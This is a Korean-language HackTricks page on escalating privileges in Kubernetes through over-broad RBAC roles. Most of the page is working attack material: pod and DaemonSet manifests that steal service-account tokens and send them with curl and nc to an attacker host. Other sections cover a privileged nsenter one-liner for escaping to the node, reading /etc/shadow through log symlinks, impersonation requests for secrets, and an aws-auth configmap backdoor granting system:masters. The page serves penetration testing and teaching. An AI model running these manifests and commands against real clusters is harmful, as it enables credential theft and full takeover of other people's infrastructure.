# Kubernetes에서 Roles/ClusterRoles 남용하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**을** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

여기에서는 몇 가지 잠재적으로 위험한 Roles 및 ClusterRoles 구성을 찾을 수 있습니다.\
`kubectl api-resources`를 사용하여 모든 지원되는 리소스를 얻을 수 있습니다.

## **권한 상승**

Kubernetes에서는 기본적으로 **4가지 주요 기술을 사용하여 권한을 상승**할 수 있습니다. 이는 클러스터 내에서 또는 외부 클라우드로의 액세스 권한을 이미 가지고 있는 상태에서 **다른 주체에 대한 액세스**와 **다른 권한**을 얻는 것을 의미합니다:

* Kubernetes 클러스터 내에서 또는 외부 클라우드로 **다른 사용자/그룹/서비스 계정(SA)를 가장한** 권한 상승
* Kubernetes 클러스터 내에서 또는 외부 클라우드로 **파드를 생성/패치/실행**할 수 있으며, 해당 파드 내에서 더 나은 권한을 가진 SAs를 **찾거나 연결**할 수 있는 권한 상승
* SAs 토큰이 비밀로 저장되므로 **비밀을 읽을 수 있는 권한** 상승
* 컨테이너에서 노드로 **이탈**할 수 있는 경우, 해당 노드에서 실행 중인 컨테이너의 모든 비밀, 노드의 자격증명 및 클라우드 내에서 노드의 권한을 도용할 수 있는 권한 상승 (있는 경우)
* 포드에서 **포트 포워드를 실행**할 수 있는 경우, 해당 포드 내에서 흥미로운 리소스에 액세스할 수 있는 경우가 있을 수 있습니다.

### 모든 리소스 또는 동사에 대한 액세스 (와일드카드)

**와일드카드 (*)는 모든 리소스에 대한 모든 동사 권한을 부여**합니다. 이는 관리자에 의해 사용됩니다. ClusterRole 내에서 이는 공격자가 클러스터 내의 모든 네임스페이스를 남용할 수 있다는 것을 의미합니다.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### 특정 동사로 모든 리소스에 접근하기

RBAC에서는 특정 권한이 중대한 위험을 가지고 있습니다:

1. **`create`:** 어떤 클러스터 리소스든 생성할 수 있는 권한을 부여하여 권한 상승을 위협합니다.
2. **`list`:** 모든 리소스를 나열할 수 있으므로 민감한 데이터가 노출될 수 있습니다.
3. **`get`:** 서비스 계정에서 비밀 정보에 접근할 수 있으므로 보안 위협이 될 수 있습니다.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod 생성 - 토큰 도용

Pod를 생성할 권한이 있는 공격자는 특권이 부여된 서비스 계정을 Pod에 연결하여 토큰을 도용하고, 서비스 계정으로 권한을 상승시킬 수 있습니다.

`bootstrap-signer` 서비스 계정의 토큰을 도용하고 공격자에게 전송하는 Pod의 예시:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: token-stealer
spec:
  serviceAccountName: bootstrap-signer
  containers:
  - name: token-stealer
    image: busybox
    command: ["/bin/sh", "-c"]
    args:
    - while true; do
        curl -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" http://attacker-ip:8000;
        sleep 10;
      done
```

이 예시에서는 `busybox` 이미지를 사용하여 Pod를 생성하고, `bootstrap-signer` 서비스 계정의 토큰을 도용하여 공격자의 IP 주소로 전송합니다. 이를 통해 공격자는 도용한 토큰을 사용하여 권한을 상승시킬 수 있습니다.
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod 생성 및 탈출

다음은 컨테이너가 가질 수 있는 모든 권한을 나타냅니다:

* **특권 액세스** (보호 기능 비활성화 및 기능 설정)
* **hostIPC 및 hostPid 네임스페이스 비활성화**는 권한 상승에 도움이 될 수 있습니다.
* **hostNetwork 네임스페이스 비활성화**는 노드의 클라우드 권한을 탈취하고 네트워크에 더 나은 액세스를 제공합니다.
* **컨테이너 내부에 호스트의 / 마운트**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

다음과 같이 pod를 생성하세요:
```bash
kubectl --token $token create -f mount_root.yaml
```
[이 트윗](https://twitter.com/mauilion/status/1129468485480751104)에서 가져온 원라이너와 추가 내용: 

```plaintext
Kubernetes RBAC is hard. ClusterRoles are powerful. ClusterRoleBindings are dangerous. ServiceAccounts are risky. Always review and audit your permissions. #Kubernetes #RBAC #Security
```

Kubernetes RBAC는 어렵습니다. ClusterRoles는 강력합니다. ClusterRoleBindings는 위험합니다. ServiceAccounts는 위험합니다. 권한을 항상 검토하고 감사하세요. #Kubernetes #RBAC #보안
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
이제 노드로 이동하여 포스트 익스플로잇 기법을 확인할 수 있습니다:

#### 은신

아마도 더 **은신**하고 싶을 것입니다. 다음 페이지에서는 이전 템플릿에서 언급한 특권 중 일부만 활성화하여 팟을 생성할 경우 액세스할 수 있는 내용을 확인할 수 있습니다:

* **특권 + hostPID**
* **특권만**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_이전 특권 있는 팟 구성을 생성/남용하는 예제는_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _에서 찾을 수 있습니다._

### 포드 생성 - 클라우드로 이동

**팟** (그리고 선택적으로 **서비스 계정**)을 **생성**할 수 있다면, **팟이나 서비스 계정에 클라우드 역할을 할당**한 다음 액세스하여 **클라우드 환경에서 특권을 얻을 수 있습니다**.\
또한, **호스트 네트워크 네임스페이스를 가진 팟을 생성**할 수 있다면, **노드** 인스턴스의 IAM 역할을 **탈취**할 수 있습니다.

자세한 정보는 다음을 확인하세요:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **배포, 데몬셋, 상태풀셋, 복제컨트롤러, 레플리카셋, 작업 및 크론잡 생성/패치**

이러한 권한을 남용하여 이전 예제와 같이 **새로운 팟을 생성**하고 특권을 탈취할 수 있습니다.

다음 YAML은 데몬셋을 생성하고 팟 내부에서 SA의 토큰을 유출합니다:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`**은 **파드 내부에서 쉘에서 명령을 실행하는 데 사용되는 쿠버네티스 리소스**입니다. 이를 통해 **컨테이너 내부에서 명령을 실행하거나 쉘에 접속**할 수 있습니다.

따라서, **파드 내부로 진입하여 SA의 토큰을 탈취하거나 특권이 있는 파드에 진입하여 노드로 이탈하고 노드 내의 모든 파드 토큰을 탈취하고 (남용하여) 노드를 악용**할 수 있습니다.
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### 포트 포워드

이 권한은 **로컬 포트를 지정된 팟의 포트로 전달**할 수 있게 해줍니다. 이는 팟 내에서 실행 중인 애플리케이션을 쉽게 디버깅하기 위한 것이지만, 공격자는 이를 악용하여 팟 내의 흥미로운 (예: DB) 또는 취약한 애플리케이션 (웹?)에 접근할 수 있습니다.
```
kubectl port-forward pod/mypod 5000:5000
```
### 호스트 쓰기 가능한 /var/log/ 탈출

[**이 연구에서 나타낸 것**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)과 같이, 호스트의 `/var/log/` 디렉토리가 마운트된 팟에 접근하거나 생성할 수 있다면, 컨테이너에서 **탈출**할 수 있습니다.\
이는 기본적으로 **Kube-API가 컨테이너의 로그를 가져오려고 할 때** (`kubectl logs <pod>`를 사용하여), **Kubelet** 서비스의 `/logs/` 엔드포인트를 사용하여 팟의 `0.log` 파일을 요청하기 때문입니다.\
Kubelet 서비스는 컨테이너의 `/var/log` 파일 시스템을 노출하는 것에 불과한 `/logs/` 엔드포인트를 노출합니다.

따라서, 컨테이너의 **/var/log/ 폴더에 쓰기 권한이 있는 공격자는 다음 2가지 방법으로 이러한 동작을 악용할 수 있습니다:

* 컨테이너의 `0.log` 파일을 수정하여 (`/var/logs/pods/namespace_pod_uid/container/0.log`에 일반적으로 위치함) `/etc/shadow`를 가리키는 **심볼릭 링크**로 만듭니다. 그런 다음, 호스트의 shadow 파일을 유출할 수 있습니다. 다음과 같이 수행할 수 있습니다:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* 만약 공격자가 `nodes/log`를 읽을 수 있는 권한을 가진 주체를 제어한다면, 그는 `/host-mounted/var/log/sym`에 `/`로의 **심볼릭 링크**를 생성할 수 있습니다. 그리고 `https://<gateway>:10250/logs/sym/`에 접근할 때, 그는 호스트의 루트 파일 시스템을 나열할 수 있습니다 (심볼릭 링크를 변경하면 파일에 접근할 수 있습니다).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**에서 **실험실 및 자동화된 악용**을 찾을 수 있습니다.

#### readOnly 보호 우회하기 <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

운이 좋다면, 고도로 권한이 있는 `CAP_SYS_ADMIN` 기능이 사용 가능한 경우, 폴더를 읽기/쓰기로 다시 마운트할 수 있습니다:
```bash
mount -o rw,remount /hostlogs/
```
#### hostPath 읽기 전용 보호 우회하기 <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**이 연구**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)에서 언급한 대로 보호를 우회할 수 있습니다:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
다른 이전 방법들과 같은 탈출을 방지하기 위해, hostPath 마운트 대신에 PersistentVolume과 PersistentVolumeClaim을 사용하여 호스트 폴더를 컨테이너에 쓰기 가능한 권한으로 마운트하는 것을 의미합니다:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **특권 계정 위장**

[**사용자 위장**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) 권한을 사용하여 공격자는 특권 계정으로 위장할 수 있습니다.

`kubectl` 명령어에서 `--as=<사용자명>` 매개변수를 사용하여 사용자로 위장하거나, `--as-group=<그룹>`을 사용하여 그룹으로 위장할 수 있습니다:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
또는 REST API를 사용하세요:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### 비밀 목록

**비밀 목록 권한은 공격자가 REST API 엔드포인트에 액세스하여 비밀을 실제로 읽을 수 있게 할 수 있습니다**.
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### 시크릿 읽기 - 토큰 ID 무차별 대입 공격

읽기 권한을 가진 토큰을 소유한 공격자는 시크릿의 정확한 이름을 사용해야만 액세스할 수 있지만, 더 넓은 범위의 "시크릿 목록" 권한과는 달리 여전히 취약점이 존재합니다. 시스템의 기본 서비스 계정은 열거될 수 있으며, 각각은 시크릿과 연결됩니다. 이러한 시크릿은 정적 접두사와 랜덤한 다섯 글자의 알파벳과 숫자로 이루어진 토큰의 이름 구조를 가지고 있습니다. (특정 문자를 제외한) [소스 코드](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)에 따르면, 이 토큰은 제한된 27자로 구성된 문자 집합(`bcdfghjklmnpqrstvwxz2456789`)에서 생성됩니다.

이 제한으로 인해 가능한 조합의 총 수는 14,348,907(27^5)로 줄어듭니다. 따라서 공격자는 몇 시간 안에 토큰을 추측하기 위해 무차별 대입 공격을 실행할 수 있으며, 이로 인해 민감한 서비스 계정에 접근하여 권한 상승이 가능할 수 있습니다.


### 인증서 서명 요청

`certificatesigningrequests` 리소스에서 **`create`** 동사를 가지고 있다면(또는 적어도 `certificatesigningrequests/nodeClient`에 가지고 있다면), **새로운 노드의** CeSR을 **생성**할 수 있습니다.

[문서](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)에 따르면 이 요청을 자동으로 승인할 수 있습니다. 따라서 추가 권한이 필요하지 않습니다. 그렇지 않은 경우, 요청을 승인할 수 있어야 하며, 이는 `certificatesigningrequests/approval`에서의 업데이트와 `signers`에서의 `approve`를 의미합니다. 이때 리소스 이름은 `<signerNameDomain>/<signerNamePath>` 또는 `<signerNameDomain>/*` 형식이어야 합니다.

필요한 모든 권한을 가진 **롤의 예시**는 다음과 같습니다:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
그래서, 새로운 노드 CSR이 승인되면, 노드의 특별한 권한을 **남용하여** 비밀을 **훔치고** 권한을 **승격**할 수 있습니다.

[**이 게시물**](https://www.4armed.com/blog/hacking-kubelet-on-gke/)과 [**이 게시물**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)에서 GKE K8s TLS 부트스트랩 구성이 **자동 서명**으로 설정되어 있으며, 이를 남용하여 새로운 K8s 노드의 자격증명을 생성한 다음 비밀을 훔쳐 권한을 승격합니다.\
만약 **언급한 권한을 가지고 있다면 동일한 작업을 수행**할 수 있습니다. 첫 번째 예제는 새로운 노드가 자신에게 마운트된 컨테이너 내부의 비밀에 액세스하는 것을 방지하는 오류를 우회합니다. 왜냐하면 **노드는 자신에게 마운트된 컨테이너의 비밀에만 액세스할 수 있기 때문입니다.**

이를 우회하는 방법은 그냥 **흥미로운 비밀이 마운트된 컨테이너의 노드 이름에 대한 노드 자격증명을 생성**하는 것입니다. (하지만 이를 어떻게 수행하는지는 첫 번째 게시물을 확인하세요):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS (AWS에서 필요) 클러스터의 kube-system 네임스페이스에서 **`configmaps`**을 수정할 수 있는 주체는 **aws-auth** configmap을 덮어쓰면 클러스터 관리자 권한을 얻을 수 있습니다.\
필요한 동사는 **`update`**와 **`patch`**이며, configmap이 생성되지 않았다면 **`create`**를 사용합니다:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**다른 계정**에서 사용자에게 액세스 권한을 부여하기 위해 **`aws-auth`**를 사용할 수 있습니다.

그러나 `aws --profile other_account eks update-kubeconfig --name <cluster-name>`은 **다른 계정에서 작동하지 않습니다**. 그러나 실제로 `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`은 이름만 사용하는 대신 클러스터의 ARN을 넣으면 작동합니다.\
`kubectl`을 작동시키려면 **피해자의 kubeconfig를 구성**하고 aws exec args에 `--profile other_account_role`을 추가하면 kubectl이 토큰을 가져오고 AWS에 연락하기 위해 다른 계정 프로필을 사용할 것입니다.
{% endhint %}

### GKE에서 권한 상승하기

GCP 주체에게 K8s 권한을 할당하는 **두 가지 방법**이 있습니다. 어떤 경우에도 주체는 클러스터에 액세스하기 위한 자격 증명을 수집할 수 있도록 **`container.clusters.get`** 권한도 필요합니다. 그렇지 않으면 **자체 kubectl 구성 파일**을 생성해야 합니다(다음 링크를 따르세요).

{% hint style="warning" %}
K8s API 엔드포인트와 통신할 때 **GCP 인증 토큰이 전송**됩니다. 그런 다음 GCP는 K8s API 엔드포인트를 통해 먼저 주체(이메일로)가 클러스터 내에서 **액세스 권한을 가지고 있는지 확인**한 다음 GCP IAM을 통해 **액세스 권한을 가지고 있는지 확인**합니다.\
이 중 **어느 하나라도** 참이면 응답이 전달됩니다. 그렇지 않으면 GCP IAM을 통해 권한을 부여하라는 **오류 메시지**가 표시됩니다.
{% endhint %}

첫 번째 방법은 **GCP IAM**을 사용하는 것입니다. K8s 권한에는 **해당하는 GCP IAM 권한**이 있으며, 주체가 해당 권한을 가지고 있다면 사용할 수 있습니다.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

두 번째 방법은 클러스터 내에서 사용자를 식별하기 위해 **이메일**을 사용하여 K8s 권한을 할당하는 것입니다(GCP 서비스 계정 포함).

### serviceaccounts 토큰 생성

**TokenRequests**(`serviceaccounts/token`)를 **생성할 수 있는 주체**입니다. K8s API 엔드포인트와 통신할 때 SAs에 대한 정보입니다([**여기**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)에서 확인).

### ephemeralcontainers

**`pods/ephemeralcontainers`**를 **`update`** 또는 **`patch`**할 수 있는 주체는 다른 팟에서 **코드 실행**을 할 수 있으며, 특권이 있는 securityContext를 가진 임시 컨테이너를 추가함으로써 노드에서 **탈출**할 수도 있습니다.

### ValidatingWebhookConfigurations 또는 MutatingWebhookConfigurations

`validatingwebhookconfigurations` 또는 `mutatingwebhookconfigurations`에 대해 `create`, `update`, `patch` 중 하나의 동사를 가진 주체는 **권한 상승**을 위해 해당 webhookconfigurations 중 하나를 **생성**할 수 있습니다.

[`mutatingwebhookconfigurations` 예제는 이 포스트의 이 섹션을 확인하세요](./#malicious-admission-controller).

### 권한 상승

다음 섹션인 [**내장된 특권 상승 방지**](./#built-in-privileged-escalation-prevention)에서 읽을 수 있듯이, 주체는 새로운 권한을 가진 역할이나 클러스터 역할을 업데이트하거나 생성할 수 없습니다. **`roles`** 또는 **`clusterroles`**에 대한 **`escalate`** 동사를 가지고 있지 않는 한.\
그런 다음 그는 자신이 가진 권한보다 더 나은 권한을 가진 새로운 역할, 클러스터 역할을 업데이트/생성할 수 있습니다.

### 노드 프록시

**`nodes/proxy`** 하위 리소스에 액세스할 수 있는 주체는 Kubelet API를 통해 팟에서 코드를 실행할 수 있습니다([**여기**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego) 참조). 이 페이지에서 Kubelet 인증에 대한 자세한 정보를 확인하세요:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

[**여기에서 Kubelet API에 권한을 가진 상태로 RCE를 얻는 예제**](../pentesting-kubernetes-services.md#kubelet-rce)를 확인할 수 있습니다.

### 팟 삭제 + 예약되지 않은 노드

**팟을 삭제**할 수 있는 주체(`pods` 리소스에 대한 `delete` 동사), **팟을 비우기**(`pods/eviction` 리소스에 대한 `create` 동사), **팟 상태 변경**(access to `pods/status`), **다른 노드 예약 불가능**(`nodes/status`에 대한 액세스) 또는 **노드 삭제**(`nodes` 리소스에 대한 `delete` 동사) 권한이 있는 주체는 팟을 통제할 수 있으므로 팟을 다른 노드로 **이동**시킬 수 있습니다. 그리고 공격자는 **탈취**한 팟에서 토큰을 **훔칠** 수 있습니다.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### 서비스 상태 (CVE-2020-8554)

**`services/status`**를 **수정**할 수 있는 주체는 **`status.loadBalancer.ingress.ip`** 필드를 설정하여 **수정되지 않은 CVE-2020-8554**를 악용하고 클러스터에 대한 **MiTM 공격을 실행**할 수 있습니다. CVE-2020-8554에 대한 대부분의 완화 조치는 ExternalIP 서비스만 방지합니다 ([**여기**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego) 참조).

### 노드 및 파드 상태

**`nodes/status`** 또는 **`pods/status`**에 대한 **`update`** 또는 **`patch`** 권한을 가진 주체는 레이블을 수정하여 강제로 스케줄링 제약 조건을 변경할 수 있습니다.

## 내장된 권한 상승 방지

Kubernetes에는 [내장된 메커니즘](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)이 있어 권한 상승을 방지합니다.

이 시스템은 **사용자가 역할이나 역할 바인딩을 수정하여 권한을 상승시킬 수 없도록 보장**합니다. 이 규칙의 강제 실행은 API 수준에서 이루어지며, RBAC 인증자가 비활성화되었을 때에도 안전장치를 제공합니다.

이 규칙은 **사용자가 역할을 생성하거나 업데이트할 수 있는 권한을 가지려면 해당 역할이 포함하는 모든 권한을 소유**해야 한다고 규정합니다. 또한 사용자의 기존 권한 범위는 역할을 생성하거나 수정하려는 역할과 일치해야 합니다. ClusterRoles의 경우 클러스터 전체이며, Roles의 경우 동일한 네임스페이스(또는 클러스터 전체)로 제한됩니다.

{% hint style="warning" %}
이전 규칙에는 예외가 있습니다. 주체가 **`roles`** 또는 **`clusterroles`**에 대한 **`escalate`** 동사를 가지고 있다면 권한이 없어도 역할과 클러스터 역할의 권한을 상승시킬 수 있습니다.
{% endhint %}

### **RoleBindings/ClusterRoleBindings 가져오기 및 패치**

{% hint style="danger" %}
**이 기술은 이전에 작동했지만, 제 테스트에 따르면 이전 섹션에서 설명한 이유로 더 이상 작동하지 않습니다. 이미 권한이 없는 경우 자신이나 다른 SA에 권한을 부여하기 위해 rolebinding을 생성/수정할 수 없습니다.**
{% endhint %}

Rolebindings를 생성할 수 있는 권한은 사용자가 **서비스 계정에 역할을 바인딩**할 수 있도록 합니다. 이 권한은 **사용자가 손상된 서비스 계정에 관리자 권한을 바인딩**할 수 있기 때문에 권한 상승으로 이어질 수 있습니다.

## 기타 공격

### 사이드카 프록시 앱

기본적으로 파드 간 통신에는 암호화가 없습니다. 상호 인증, 양방향, 파드 간.

#### 사이드카 프록시 앱 생성 <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

.yaml 파일을 생성하세요.
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
당신의 .yaml 파일을 편집하고 주석 처리된 라인을 추가하세요.
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
프록시의 로그를 확인하세요:
```bash
kubectl logs app -C proxy
```
더 많은 정보는 다음 링크에서 확인할 수 있습니다: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### 악성 Admission Controller

Admission Controller는 Kubernetes API 서버로의 요청을 가로채는데, 이는 요청이 인증 및 권한 부여된 후에 발생합니다.

만약 공격자가 Mutationg Admission Controller를 삽입하는데 성공한다면, 이미 인증된 요청을 수정할 수 있게 됩니다. 이는 잠재적으로 권한 상승(privesc)을 할 수 있게 하며, 더 자주 클러스터에 지속적으로 남을 수 있게 합니다.

**예시: [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**:
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
상태를 확인하여 준비되었는지 확인하십시오:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

그런 다음 새로운 파드를 배포하세요:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
